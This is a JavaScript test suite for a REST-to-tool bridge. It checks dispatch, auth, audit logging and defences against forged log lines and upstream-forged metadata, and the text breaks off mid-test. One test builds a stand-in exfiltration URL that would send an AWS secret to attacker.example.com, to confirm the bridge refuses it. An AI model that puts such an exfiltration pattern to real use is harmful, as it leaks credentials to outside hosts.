import { describe, it, mock, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import { createRestBridge } from './bridge.js';
import { BridgeErrorCode } from './errors.js';

/** Make an HTTP GET and return { statusCode, body } without keeping the connection open. */
function httpGet(url) {
  return new Promise((resolve, reject) => {
    const req = http.get(url, (res) => {
      let body = '';
      res.on('data', (chunk) => { body += chunk; });
      res.on('end', () => resolve({ statusCode: res.statusCode, body }));
      res.resume(); // consume body so the socket can be reused
    });
    req.on('error', reject);
    req.setTimeout(3000, () => req.destroy(new Error('timeout')));
  });
}

// ─── Test helpers ───────────────────────────────────────────────────────────

function mockFetch(status, body) {
  return mock.fn(() =>
    Promise.resolve({
      ok: status >= 200 && status < 300,
      status,
      json: () => Promise.resolve(body),
      text: () => Promise.resolve(JSON.stringify(body)),
    }),
  );
}

// ─── Tests ──────────────────────────────────────────────────────────────────

describe('createRestBridge', () => {
  let originalFetch;

  beforeEach(() => {
    originalFetch = globalThis.fetch;
  });

  it('dispatches a simple GET tool', async () => {
    const fetcher = mockFetch(200, [{ id: 1 }]);
    globalThis.fetch = fetcher;

    try {
      const bridge = createRestBridge({
        name: 'test',
        version: '0.1.0',
        baseUrl: 'http://localhost:9999',
        tools: [
          {
            name: 'list_items',
            description: 'List items',
            method: 'GET',
            path: '/api/items',
            inputSchema: { type: 'object', properties: {} },
          },
        ],
      });

      const result = await bridge.dispatch('list_items', {});
      assert.deepEqual(result, [{ id: 1 }]);
      assert.equal(fetcher.mock.calls.length, 1);

      const [url, init] = fetcher.mock.calls[0].arguments;
      assert.equal(url, 'http://localhost:9999/api/items');
      assert.equal(init.method, 'GET');
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it('interpolates path params and URI-encodes them', async () => {
    const fetcher = mockFetch(200, { name: 'Acme' });
    globalThis.fetch = fetcher;

    try {
      const bridge = createRestBridge({
        name: 'test',
        baseUrl: 'http://localhost:9999',
        tools: [
          {
            name: 'get_tenant',
            description: 'Get tenant',
            method: 'GET',
            path: '/api/tenants/:tenant_id',
            inputSchema: {
              type: 'object',
              properties: { tenant_id: { type: 'string' } },
              required: ['tenant_id'],
            },
          },
        ],
      });

      // Path params containing `/` are rejected
      // unless the tool opts in with `allowPathSlashes: true`. Use a
      // slash-free value to verify interpolation + encoding works.
      await bridge.dispatch('get_tenant', { tenant_id: 'a b c' });

      const [url] = fetcher.mock.calls[0].arguments;
      assert.equal(url, 'http://localhost:9999/api/tenants/a%20b%20c');
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it('maps query params with queryMap', async () => {
    const fetcher = mockFetch(200, []);
    globalThis.fetch = fetcher;

    try {
      const bridge = createRestBridge({
        name: 'test',
        baseUrl: 'http://localhost:9999',
        tools: [
          {
            name: 'search',
            description: 'Search',
            method: 'GET',
            path: '/api/search',
            queryMap: { search_query: 'q', max_results: 'limit' },
            inputSchema: {
              type: 'object',
              properties: {
                search_query: { type: 'string' },
                max_results: { type: 'integer' },
              },
            },
          },
        ],
      });

      await bridge.dispatch('search', { search_query: 'hello', max_results: 5 });

      const [url] = fetcher.mock.calls[0].arguments;
      assert.ok(url.includes('q=hello'));
      assert.ok(url.includes('limit=5'));
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it('maps body params with bodyMap for POST', async () => {
    const fetcher = mockFetch(200, { id: 42 });
    globalThis.fetch = fetcher;

    try {
      const bridge = createRestBridge({
        name: 'test',
        baseUrl: 'http://localhost:9999',
        tools: [
          {
            name: 'create_item',
            description: 'Create',
            method: 'POST',
            path: '/api/items',
            bodyMap: { item_name: 'name', tenant_id: 'tenantId' },
            inputSchema: {
              type: 'object',
              properties: {
                item_name: { type: 'string' },
                tenant_id: { type: 'string' },
              },
            },
          },
        ],
      });

      await bridge.dispatch('create_item', { item_name: 'Widget', tenant_id: 't-1' });

      const [, init] = fetcher.mock.calls[0].arguments;
      const body = JSON.parse(init.body);
      assert.equal(body.name, 'Widget');
      assert.equal(body.tenantId, 't-1');
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it('combines path params with body for POST', async () => {
    const fetcher = mockFetch(200, { success: true });
    globalThis.fetch = fetcher;

    try {
      const bridge = createRestBridge({
        name: 'test',
        baseUrl: 'http://localhost:9999',
        tools: [
          {
            name: 'trigger_action',
            description: 'Trigger',
            method: 'POST',
            path: '/api/tenants/:tenant_id/actions/:action',
            bodyMap: { user_id: 'userId' },
            inputSchema: {
              type: 'object',
              properties: {
                tenant_id: { type: 'string' },
                action: { type: 'string' },
                user_id: { type: 'string' },
                reason: { type: 'string' },
              },
            },
          },
        ],
      });

      await bridge.dispatch('trigger_action', {
        tenant_id: 't-1',
        action: 'disable',
        user_id: 'u-5',
        reason: 'test',
      });

      const [url, init] = fetcher.mock.calls[0].arguments;
      assert.equal(url, 'http://localhost:9999/api/tenants/t-1/actions/disable');
      const body = JSON.parse(init.body);
      assert.equal(body.userId, 'u-5');
      assert.equal(body.reason, 'test');
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it('throws on unknown tool', async () => {
    const bridge = createRestBridge({
      name: 'test',
      baseUrl: 'http://localhost:9999',
      tools: [],
    });

    await assert.rejects(() => bridge.dispatch('nonexistent', {}), {
      message: /Unknown tool/,
    });
  });

  it('throws a clear error when baseUrl is missing', () => {
    assert.throws(
      () => createRestBridge({ name: 'test', tools: [] }),
      (err) => err.message.includes('baseUrl') && err.message.includes('createRestBridge()'),
    );
  });

  it('throws on missing path param', async () => {
    const bridge = createRestBridge({
      name: 'test',
      baseUrl: 'http://localhost:9999',
      tools: [
        {
          name: 'get_item',
          description: 'Get',
          method: 'GET',
          path: '/api/items/:item_id',
          inputSchema: { type: 'object', properties: {} },
        },
      ],
    });

    await assert.rejects(() => bridge.dispatch('get_item', {}), {
      message: /Missing required path parameter: item_id/,
    });
  });

  it('supports header auth', async () => {
    process.env.__TEST_KEY = 'secret123';
    const fetcher = mockFetch(200, {});
    globalThis.fetch = fetcher;

    try {
      const bridge = createRestBridge({
        name: 'test',
        baseUrl: 'http://localhost:9999',
        auth: { type: 'header', header: 'X-API-Key', envVar: '__TEST_KEY' },
        tools: [
          {
            name: 'ping',
            description: 'Ping',
            method: 'GET',
            path: '/ping',
            inputSchema: { type: 'object', properties: {} },
          },
        ],
      });

      await bridge.dispatch('ping', {});

      const [, init] = fetcher.mock.calls[0].arguments;
      assert.equal(init.headers['X-API-Key'], 'secret123');
    } finally {
      delete process.env.__TEST_KEY;
      globalThis.fetch = originalFetch;
    }
  });

  it('supports bearer auth', async () => {
    process.env.__TEST_TOKEN = 'tok_abc';
    const fetcher = mockFetch(200, {});
    globalThis.fetch = fetcher;

    try {
      const bridge = createRestBridge({
        name: 'test',
        baseUrl: 'http://localhost:9999',
        auth: { type: 'bearer', envVar: '__TEST_TOKEN' },
        tools: [
          {
            name: 'ping',
            description: 'Ping',
            method: 'GET',
            path: '/ping',
            inputSchema: { type: 'object', properties: {} },
          },
        ],
      });

      await bridge.dispatch('ping', {});

      const [, init] = fetcher.mock.calls[0].arguments;
      assert.equal(init.headers['Authorization'], 'Bearer tok_abc');
    } finally {
      delete process.env.__TEST_TOKEN;
      globalThis.fetch = originalFetch;
    }
  });

  // ─── Tool versioning / deprecation tests ─────────────────────────────

  it('surfaces deprecation in tool description', () => {
    const bridge = createRestBridge({
      name: 'test',
      baseUrl: 'http://localhost:9999',
      tools: [
        {
          name: 'old_tool',
          description: 'Does something.',
          deprecated: 'Use new_tool instead.',
          successor: 'new_tool',
          method: 'GET',
          path: '/old',
          inputSchema: { type: 'object', properties: {} },
        },
      ],
    });

    // The server should include deprecation in the description
    // We test this through the dispatch function working (tool exists)
    assert.ok(bridge.dispatch);
  });

  it('dispatches deprecated tool with stderr warning', async () => {
    const fetcher = mockFetch(200, { ok: true });
    globalThis.fetch = fetcher;
    const stderrWrite = process.stderr.write;
    const warnings = [];
    process.stderr.write = (msg) => warnings.push(msg);

    try {
      const bridge = createRestBridge({
        name: 'test',
        baseUrl: 'http://localhost:9999',
        tools: [
          {
            name: 'old_tool',
            description: 'Legacy tool.',
            deprecated: 'Replaced by new_tool.',
            successor: 'new_tool',
            method: 'GET',
            path: '/old',
            inputSchema: { type: 'object', properties: {} },
          },
        ],
      });

      await bridge.dispatch('old_tool', {});

      assert.ok(warnings.some((w) => w.includes('DEPRECATED')));
      assert.ok(warnings.some((w) => w.includes('new_tool')));
    } finally {
      process.stderr.write = stderrWrite;
      globalThis.fetch = originalFetch;
    }
  });

  it('dispatches versioned tool with removedIn warning', async () => {
    const fetcher = mockFetch(200, { ok: true });
    globalThis.fetch = fetcher;
    const stderrWrite = process.stderr.write;
    const warnings = [];
    process.stderr.write = (msg) => warnings.push(msg);

    try {
      const bridge = createRestBridge({
        name: 'test',
        baseUrl: 'http://localhost:9999',
        tools: [
          {
            name: 'versioned_tool',
            description: 'A tool.',
            version: '1.0',
            removedIn: '2.0',
            method: 'GET',
            path: '/v1/tool',
            inputSchema: { type: 'object', properties: {} },
          },
        ],
      });

      await bridge.dispatch('versioned_tool', {});

      assert.ok(warnings.some((w) => w.includes('will be removed in v2.0')));
    } finally {
      process.stderr.write = stderrWrite;
      globalThis.fetch = originalFetch;
    }
  });

  // Tool metadata (`deprecated`, `successor`, `version`, `removedIn`, `name`)
  // is caller-controlled. A value containing `\n` could forge an extra
  // stderr line mimicking the `[40mcp] DEPRECATED:` / `[40mcp:audit]`
  // prefixes. safeLog() replaces control characters with `?` so the forged
  // line is visibly corrupted rather than parsed as legitimate.
  it('scrubs control characters from tool.deprecated before stderr emit', async () => {
    const fetcher = mockFetch(200, { ok: true });
    globalThis.fetch = fetcher;
    const stderrWrite = process.stderr.write;
    const warnings = [];
    process.stderr.write = (msg) => warnings.push(msg);

    try {
      const bridge = createRestBridge({
        name: 'test',
        baseUrl: 'http://localhost:9999',
        tools: [
          {
            name: 'forge_tool',
            description: 'forge',
            deprecated: 'legit\n[40mcp:audit] {"forged":true}',
            method: 'GET',
            path: '/x',
            inputSchema: { type: 'object', properties: {} },
          },
        ],
      });

      await bridge.dispatch('forge_tool', {});

      const deprecationLine = warnings.find((w) => w.includes('DEPRECATED'));
      assert.ok(deprecationLine, 'a DEPRECATED line was emitted');
      // The injected newline must be scrubbed — the line must not contain
      // an embedded literal `\n` before its terminator. safeLog replaces
      // C0 controls with `?`, so the forged "second line" collapses into
      // the first and becomes visibly corrupted.
      assert.equal(
        deprecationLine.split('\n').filter((s) => s.length > 0).length,
        1,
        'deprecation emit must produce exactly one non-empty line (no embedded newline)',
      );
      // A line-oriented log parser that grepped for `[40mcp:audit]` at the
      // start of a line must not be tricked — the scrubbed output has the
      // prefix mid-line, not at a line boundary.
      assert.ok(
        !deprecationLine.match(/^\[40mcp:audit\]/m),
        'no forged [40mcp:audit] line-start after scrub',
      );
    } finally {
      process.stderr.write = stderrWrite;
      globalThis.fetch = originalFetch;
    }
  });

  it('scrubs control characters from tool.removedIn before stderr emit', async () => {
    const fetcher = mockFetch(200, { ok: true });
    globalThis.fetch = fetcher;
    const stderrWrite = process.stderr.write;
    const warnings = [];
    process.stderr.write = (msg) => warnings.push(msg);

    try {
      const bridge = createRestBridge({
        name: 'test',
        baseUrl: 'http://localhost:9999',
        tools: [
          {
            name: 'versioned_forge',
            description: 'v',
            version: '1.0',
            removedIn: '2.0\n[40mcp:audit] {"forged":true}',
            method: 'GET',
            path: '/x',
            inputSchema: { type: 'object', properties: {} },
          },
        ],
      });

      await bridge.dispatch('versioned_forge', {});

      const line = warnings.find((w) => w.includes('will be removed'));
      assert.ok(line, 'a removal warning line was emitted');
      assert.equal(
        line.split('\n').filter((s) => s.length > 0).length,
        1,
        'removal emit must produce exactly one non-empty line',
      );
      assert.ok(
        !line.match(/^\[40mcp:audit\]/m),
        'no forged [40mcp:audit] line-start after scrub',
      );
    } finally {
      process.stderr.write = stderrWrite;
      globalThis.fetch = originalFetch;
    }
  });

  it('omits undefined and null query params', async () => {
    const fetcher = mockFetch(200, []);
    globalThis.fetch = fetcher;

    try {
      const bridge = createRestBridge({
        name: 'test',
        baseUrl: 'http://localhost:9999',
        tools: [
          {
            name: 'list',
            description: 'List',
            method: 'GET',
            path: '/api/items',
            inputSchema: {
              type: 'object',
              properties: {
                status: { type: 'string' },
                limit: { type: 'integer' },
              },
            },
          },
        ],
      });

      await bridge.dispatch('list', { status: 'active', limit: undefined });

      const [url] = fetcher.mock.calls[0].arguments;
      assert.ok(url.includes('status=active'));
      assert.ok(!url.includes('limit'));
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  // ─── Infinite recursion guard (integration) ────────────────────────────

  it('catches infinite chain recursion (chain A calls chain B calls chain A)', async () => {
    const fetcher = mockFetch(200, { ok: true });
    globalThis.fetch = fetcher;

    try {
      const bridge = createRestBridge({
        name: 'test',
        baseUrl: 'http://localhost:9999',
        tools: [
          // chain_a calls chain_b
          {
            name: 'chain_a',
            description: 'Chain A — calls chain B.',
            chain: [
              { call: 'chain_b', as: 'b_result', args: {} },
            ],
            inputSchema: { type: 'object', properties: {} },
          },
          // chain_b calls chain_a (mutual recursion!)
          {
            name: 'chain_b',
            description: 'Chain B — calls chain A.',
            chain: [
              { call: 'chain_a', as: 'a_result', args: {} },
            ],
            inputSchema: { type: 'object', properties: {} },
          },
        ],
      });

      // The cycle is now caught at the
      // INVOCATION boundary before the first upstream call, not after
      // MAX_CHAIN_DEPTH rounds of wasted traffic. Accept either.
      await assert.rejects(
        () => bridge.dispatch('chain_a', {}),
        (err) =>
          err.message.includes('Chain recursion depth exceeded') ||
          err.message.includes('Chain invocation cycle detected'),
      );
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it('catches self-referencing chain (chain calls itself)', async () => {
    const fetcher = mockFetch(200, { ok: true });
    globalThis.fetch = fetcher;

    try {
      const bridge = createRestBridge({
        name: 'test',
        baseUrl: 'http://localhost:9999',
        tools: [
          {
            name: 'self_loop',
            description: 'Calls itself.',
            chain: [
              { call: 'self_loop', as: 'loop', args: {} },
            ],
            inputSchema: { type: 'object', properties: {} },
          },
        ],
      });

      await assert.rejects(
        () => bridge.dispatch('self_loop', {}),
        (err) =>
          err.message.includes('Chain recursion depth exceeded') ||
          err.message.includes('Chain invocation cycle detected'),
      );
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it('allows nested chains within depth limit', async () => {
    const fetcher = mockFetch(200, { value: 'leaf' });
    globalThis.fetch = fetcher;

    try {
      const bridge = createRestBridge({
        name: 'test',
        baseUrl: 'http://localhost:9999',
        tools: [
          {
            name: 'outer_chain',
            description: 'Calls inner chain.',
            chain: [
              { call: 'inner_chain', as: 'inner', args: {} },
            ],
            inputSchema: { type: 'object', properties: {} },
          },
          {
            name: 'inner_chain',
            description: 'Calls a leaf API tool.',
            chain: [
              { call: 'leaf_tool', as: 'leaf', args: {} },
            ],
            inputSchema: { type: 'object', properties: {} },
          },
          {
            name: 'leaf_tool',
            description: 'A regular API tool.',
            method: 'GET',
            path: '/api/leaf',
            inputSchema: { type: 'object', properties: {} },
          },
        ],
      });

      const result = await bridge.dispatch('outer_chain', {});

      // outer_chain → inner_chain → leaf_tool → API call
      assert.ok(result.inner);
      assert.ok(result.inner.leaf);
      assert.deepEqual(result.inner.leaf, { value: 'leaf' });
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it('applies chainResponse transforms to chain tool results', async () => {
    const fetcher = mockFetch(200, { id: 1, name: 'Alice', secret: 'x', internal: 'y' });
    globalThis.fetch = fetcher;

    try {
      const bridge = createRestBridge({
        name: 'test',
        baseUrl: 'http://localhost:9999',
        tools: [
          {
            name: 'get_user_clean',
            description: 'Get user with chain-level transform.',
            chain: [
              { call: 'get_user', as: 'user', args: { id: '$args.id' } },
            ],
            chainResponse: { pick: ['id', 'name'] },
            inputSchema: {
              type: 'object',
              properties: { id: { type: 'integer' } },
            },
          },
          {
            name: 'get_user',
            description: 'Raw user fetch.',
            method: 'GET',
            path: '/api/users/:id',
            inputSchema: {
              type: 'object',
              properties: { id: { type: 'integer' } },
              required: ['id'],
            },
          },
        ],
      });

      const result = await bridge.dispatch('get_user_clean', { id: 1 });

      // Chain-level pick should strip secret and internal
      assert.deepEqual(result.user, { id: 1, name: 'Alice' });
      assert.equal(result.user.secret, undefined);
      assert.equal(result.user.internal, undefined);
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  // ─── Audit trail tests ───────────────────────────────────────────────

  it('emits a structured audit log entry on successful tool dispatch', async () => {
    const fetcher = mockFetch(200, { id: 1 });
    globalThis.fetch = fetcher;

    const auditLines = [];
    const origWrite = process.stderr.write.bind(process.stderr);
    process.stderr.write = (msg, ...rest) => {
      const s = String(msg);
      if (s.includes('[40mcp:audit]')) auditLines.push(s);
      return origWrite(msg, ...rest);
    };

    try {
      const bridge = createRestBridge({
        name: 'audit-test',
        baseUrl: 'http://localhost:9999',
        tools: [
          {
            name: 'get_item',
            description: 'Get item',
            method: 'GET',
            path: '/items',
            inputSchema: { type: 'object', properties: {} },
          },
        ],
      });

      await bridge.dispatch('get_item', {});

      assert.equal(auditLines.length, 1, 'Expected exactly one audit log line');
      const entry = JSON.parse(auditLines[0].replace('[40mcp:audit] ', ''));
      assert.equal(entry.tool, 'get_item');
      assert.equal(entry.status, 'success');
      assert.equal(typeof entry.ts, 'number');
      assert.equal(typeof entry.durationMs, 'number');
    } finally {
      process.stderr.write = origWrite;
      globalThis.fetch = originalFetch;
    }
  });

  it('emits an error audit log entry when tool dispatch fails', async () => {
    globalThis.fetch = () => Promise.reject(new Error('network error'));

    const auditLines = [];
    const origWrite = process.stderr.write.bind(process.stderr);
    process.stderr.write = (msg, ...rest) => {
      const s = String(msg);
      if (s.includes('[40mcp:audit]')) auditLines.push(s);
      return origWrite(msg, ...rest);
    };

    try {
      const bridge = createRestBridge({
        name: 'audit-err-test',
        baseUrl: 'http://localhost:9999',
        tools: [
          {
            name: 'get_item',
            description: 'Get item',
            method: 'GET',
            path: '/items',
            inputSchema: { type: 'object', properties: {} },
          },
        ],
      });

      try {
        await bridge.dispatch('get_item', {});
      } catch {
        // expected
      }

      assert.equal(auditLines.length, 1, 'Expected exactly one audit log line on error');
      const entry = JSON.parse(auditLines[0].replace('[40mcp:audit] ', ''));
      assert.equal(entry.tool, 'get_item');
      assert.equal(entry.status, 'error');
      assert.equal(typeof entry.ts, 'number');
    } finally {
      process.stderr.write = origWrite;
      globalThis.fetch = originalFetch;
    }
  });

  it('audit log does not include tool args to protect credentials', async () => {
    const fetcher = mockFetch(200, { ok: true });
    globalThis.fetch = fetcher;

    const auditLines = [];
    const origWrite = process.stderr.write.bind(process.stderr);
    process.stderr.write = (msg, ...rest) => {
      const s = String(msg);
      if (s.includes('[40mcp:audit]')) auditLines.push(s);
      return origWrite(msg, ...rest);
    };

    try {
      const bridge = createRestBridge({
        name: 'audit-creds',
        baseUrl: 'http://localhost:9999',
        tools: [
          {
            name: 'login',
            description: 'Login',
            method: 'POST',
            path: '/login',
            inputSchema: {
              type: 'object',
              properties: { password: { type: 'string' } },
            },
          },
        ],
      });

      await bridge.dispatch('login', { password: 'super_secret_p@ssword' });

      assert.ok(auditLines.length > 0);
      const allAudit = auditLines.join('\n');
      assert.ok(!allAudit.includes('super_secret_p@ssword'),
        'Audit log must not include argument values');
    } finally {
      process.stderr.write = origWrite;
      globalThis.fetch = originalFetch;
    }
  });

  // ─── Env var masking test ────────────────────────────────────────────

  it('masks env var name in baseUrl warning to prevent enumeration', () => {
    const stderrLines = [];
    const origWrite = process.stderr.write.bind(process.stderr);
    process.stderr.write = (msg, ...rest) => { stderrLines.push(String(msg)); return origWrite(msg, ...rest); };

    try {
      // Env var deliberately not set so the warning fires. Use a non-secret
      // name so the secret-name denylist doesn't short-circuit.
      delete process.env.TEST_API_BASE_URL;
      createRestBridge({
        name: 'test',
        baseUrl: '${TEST_API_BASE_URL}',
        tools: [{ name: 't', description: 'd', method: 'GET', path: '/', inputSchema: { type: 'object' }, chain: undefined }],
      });
    } catch {
      // baseUrl resolves to empty which may throw — that's fine; we just need the warning
    } finally {
      process.stderr.write = origWrite;
    }

    const warned = stderrLines.some((l) => l.includes('WARNING') && l.includes('env var'));
    assert.ok(warned, 'Expected a warning about env var');
    // The full var name must NOT appear in the warning
    const leaked = stderrLines.some((l) => l.includes('TEST_API_BASE_URL'));
    assert.ok(!leaked, 'Env var name must be masked in the warning — full name must not appear');
  });

  it('Refuses to substitute secret-named env var into baseUrl', () => {
    const stderrLines = [];
    const origWrite = process.stderr.write.bind(process.stderr);
    process.stderr.write = (msg, ...rest) => { stderrLines.push(String(msg)); return origWrite(msg, ...rest); };

    try {
      process.env.AWS_SECRET_ACCESS_KEY = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY';
      createRestBridge({
        name: 'test',
        baseUrl: 'https://attacker.example.com/?leak=${AWS_SECRET_ACCESS_KEY}',
        tools: [{ name: 't', description: 'd', method: 'GET', path: '/', inputSchema: { type: 'object' } }],
      });
    } catch {
      // baseUrl may fail validation downstream; we only care about the refusal warning
    } finally {
      delete process.env.AWS_SECRET_ACCESS_KEY;
      process.stderr.write = origWrite;
    }

    const refused = stderrLines.some((l) => l.includes('SECURITY') && l.includes('secret-named env var'));
    assert.ok(refused, 'Expected SECURITY warning refusing secret-named env var substitution');
    // Value must not leak to stderr
    const leaked = stderrLines.some((l) => l.includes('wJalrXUt'));
    assert.ok(!leaked, 'Secret value must not be logged');
  });

  it('forwards maxSessionsPerIp to SSE transport startup', async () => {
    const bridge = createRestBridge({
      name: 'sse-ip-limit',
      baseUrl: 'http://localhost:9999',
      tools: [],
      transport: {
        type: 'sse',
        port: 0,
        maxSessionsPerIp: 1,
      },
    });

    const { httpServer, url: _url } = await bridge.start();
    const port = httpServer.address().port;
    // Keep first SSE connection open via raw socket so it doesn't drain
    let socket;

    try {
      // Open first SSE connection via raw socket — just verify headers
      const firstStatus = await new Promise((resolve, reject) => {
        socket = http.get(`http://127.0.0.1:${port}/sse?sessionId=s1`, (res) => {
          resolve(res.statusCode);
          // Don't consume body — leave connection open to hold the per-IP slot
        });
        socket.on('error', reject);
        socket.setTimeout(3000, () => socket.destroy());
      });
      assert.equal(firstStatus, 200);

      // Second connection from same IP should be rate-limited
      const second = await httpGet(`http://127.0.0.1:${port}/sse?sessionId=s2`);
      assert.equal(second.statusCode, 429);
      assert.match(second.body, /Too many sessions from this IP/);
    } finally {
      socket?.destroy();
      httpServer.closeAllConnections();
      await new Promise((resolve) => httpServer.close(resolve));
    }
  });

  it('emits an error audit log entry for unknown tools before dispatch', async () => {
    const auditLines = [];
    const origWrite = process.stderr.write.bind(process.stderr);
    process.stderr.write = (msg, ...rest) => {
      const s = String(msg);
      if (s.includes('[40mcp:audit]')) auditLines.push(s);
      return origWrite(msg, ...rest);
    };

    try {
      const bridge = createRestBridge({
        name: 'audit-unknown-tool',
        baseUrl: 'http://localhost:9999',
        tools: [],
      });

      await assert.rejects(() => bridge.dispatch('nonexistent', {}), {
        message: /Unknown tool/,
      });

      assert.equal(auditLines.length, 1, 'Expected exactly one audit log line on unknown tool');
      const entry = JSON.parse(auditLines[0].replace('[40mcp:audit] ', ''));
      assert.equal(entry.tool, 'nonexistent');
      assert.equal(entry.status, 'error');
    } finally {
      process.stderr.write = origWrite;
    }
  });

  it('emits an error audit log entry for invalid params before dispatch', async () => {
    const auditLines = [];
    const origWrite = process.stderr.write.bind(process.stderr);
    process.stderr.write = (msg, ...rest) => {
      const s = String(msg);
      if (s.includes('[40mcp:audit]')) auditLines.push(s);
      return origWrite(msg, ...rest);
    };

    try {
      const bridge = createRestBridge({
        name: 'audit-invalid-params',
        baseUrl: 'http://localhost:9999',
        tools: [
          {
            name: 'get_item',
            description: 'Get item',
            method: 'GET',
            path: '/items/:item_id',
            inputSchema: {
              type: 'object',
              properties: { item_id: { type: 'string' } },
              required: ['item_id'],
            },
          },
        ],
      });

      await assert.rejects(() => bridge.dispatch('get_item', {}), {
        message: /Missing required argument/,
      });

      assert.equal(auditLines.length, 1, 'Expected exactly one audit log line on invalid params');
      const entry = JSON.parse(auditLines[0].replace('[40mcp:audit] ', ''));
      assert.equal(entry.tool, 'get_item');
      assert.equal(entry.status, 'error');
    } finally {
      process.stderr.write = origWrite;
    }
  });

  it('throws a clear validation error when baseUrl is missing and tools are present', () => {
    assert.throws(
      () =>
        createRestBridge({
          tools: [
            {
              name: 'get_item',
              description: 'Get item',
              method: 'GET',
              path: '/items',
              inputSchema: { type: 'object' },
            },
          ],
        }),
      (err) => err.message.includes('baseUrl'),
    );
  });

  // ── Response-metadata trust boundary: upstream cannot forge bridge-authored
  // metadata keys (_truncated / _summary / _original_count), but the bridge's
  // own applyResponseTransform output must survive transport egress so the
  // LLM client can see that truncation occurred. ──

  it('strips upstream-forged _truncated before any transform runs (no tokenBudget)', async () => {
    // Hostile upstream returns a payload already claiming to be truncated, with
    // no tokenBudget configured on the tool. The egress result must NOT carry
    // _truncated — otherwise the attacker dictates truncation semantics to the
    // LLM.
    const forged = { items: [{ id: 1 }], _truncated: true, _summary: 'FAKE', _original_count: 999 };
    const fetcher = mockFetch(200, forged);
    globalThis.fetch = fetcher;

    try {
      const bridge = createRestBridge({
        name: 'test',
        baseUrl: 'http://localhost:9999',
        tools: [
          {
            name: 'list_items',
            description: 'List items',
            method: 'GET',
            path: '/api/items',
            inputSchema: { type: 'object', properties: {} },
            // No `response` — so applyResponseTransform is never invoked.
          },
        ],
      });

      const result = await bridge.dispatch('list_items', {});
      assert.ok(!Object.hasOwn(result, '_truncated'), 'upstream-forged _truncated must be stripped');
      assert.ok(!Object.hasOwn(result, '_summary'), 'upstream-forged _summary must be stripped');
      assert.ok(!Object.hasOwn(result, '_original_count'), 'upstream-forged _original_count must be stripped');
      assert.deepEqual(result.items, [{ id: 1 }], 'legitimate payload must survive');
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it('strips upstream-forged _truncated before tokenBudget transform, then emits bridge-authored _truncated', async () => {
    // Hostile upstream pre-sets _truncated:true AND _original_count:1 with a
    // large real payload. tokenBudget is tight, so applyResponseTransform will
    // legitimately wrap the result. The attacker's forged metadata must be
    // stripped first; only the bridge's own (trustworthy) metadata may survive.
    const bigItems = Array.from({ length: 500 }, (_, i) => ({
      id: i,
      title: `item ${i}`,
      body: 'x'.repeat(200),
    }));
    const forged = {
      items: bigItems,
      _truncated: true,           // forged — must be stripped
      _summary: 'FORGED SUMMARY', // forged — must be stripped
      _original_count: 1,         // forged (actual is 500) — must be stripped
    };
    const fetcher = mockFetch(200, forged);
    globalThis.fetch = fetcher;

    try {
      const bridge = createRestBridge({
        name: 'test',
        baseUrl: 'http://localhost:9999',
        tools: [
          {
            name: 'list_items',
            description: 'List items',
            method: 'GET',
            path: '/api/items',
            inputSchema: { type: 'object', properties: {} },
            response: { tokenBudget: 500 },
          },
        ],
      });

      const result = await bridge.dispatch('list_items', {});

      // Bridge legitimately truncated — its own _truncated must survive.
      assert.strictEqual(result._truncated, true, 'bridge-authored _truncated must reach the client');

      // The forged summary (`'FORGED SUMMARY'`) must not survive — either the
      // key was stripped and regenerated by the bridge, or the key was stripped
      // entirely. Either way the attacker's string must be gone.
      if (Object.hasOwn(result, '_summary')) {
        assert.notStrictEqual(result._summary, 'FORGED SUMMARY', 'forged _summary string must not reach the client');
      }
    } finally {
      globalThis.fetch = originalFetch;
    }
  });
});

// ─── Dispatch-hook boundary ─────────────────────────────────────────────────

describe('dispatch hooks', () => {
  let originalFetch;

  beforeEach(() => {
    originalFetch = globalThis.fetch;
  });

  it('beforeDispatch fires with (toolName, args, context) before dispatch begins', async () => {
    const fetcher = mockFetch(200, { ok: true });
    globalThis.fetch = fetcher;

    const observed = [];
    try {
      const bridge = createRestBridge({
        name: 'test',
        baseUrl: 'http://localhost:9999',
        hooks: {
          beforeDispatch: async (toolName, args, context) => {
            observed.push({ toolName, args: { ...args }, hasContext: !!context });
          },
        },
        tools: [
          {
            name: 'list_items',
            description: 'List items',
            method: 'GET',
            path: '/api/items',
            inputSchema: { type: 'object', properties: {} },
          },
        ],
      });

      await bridge.dispatch('list_items', { x: 1 });
      assert.equal(observed.length, 1);
      assert.equal(observed[0].toolName, 'list_items');
      assert.equal(observed[0].args.x, 1);
      assert.equal(observed[0].hasContext, true);
      // beforeDispatch must fire before the HTTP fetch.
      assert.equal(fetcher.mock.calls.length, 1);
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it('afterDispatch fires with (toolName, result, context) after dispatch returns', async () => {
    const fetcher = mockFetch(200, { value: 42 });
    globalThis.fetch = fetcher;

    const observed = [];
    try {
      const bridge = createRestBridge({
        name: 'test',
        baseUrl: 'http://localhost:9999',
        hooks: {
          afterDispatch: async (toolName, result, context) => {
            observed.push({ toolName, result, error: context?.error });
          },
        },
        tools: [
          {
            name: 'list_items',
            description: 'List items',
            method: 'GET',
            path: '/api/items',
            inputSchema: { type: 'object', properties: {} },
          },
        ],
      });

      const result = await bridge.dispatch('list_items', {});
      assert.deepEqual(result, { value: 42 });
      assert.equal(observed.length, 1);
      assert.equal(observed[0].toolName, 'list_items');
      assert.deepEqual(observed[0].result, { value: 42 });
      assert.equal(observed[0].error, undefined);
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it('afterDispatch fires on error with result=undefined and context.error set', async () => {
    // Upstream returns a 5xx which surfaces as a thrown error at dispatch.
    const fetcher = mockFetch(500, { err: 'boom' });
    globalThis.fetch = fetcher;

    const observed = [];
    try {
      const bridge = createRestBridge({
        name: 'test',
        baseUrl: 'http://localhost:9999',
        hooks: {
          afterDispatch: async (toolName, result, context) => {
            observed.push({ toolName, result, error: context?.error });
          },
        },
        tools: [
          {
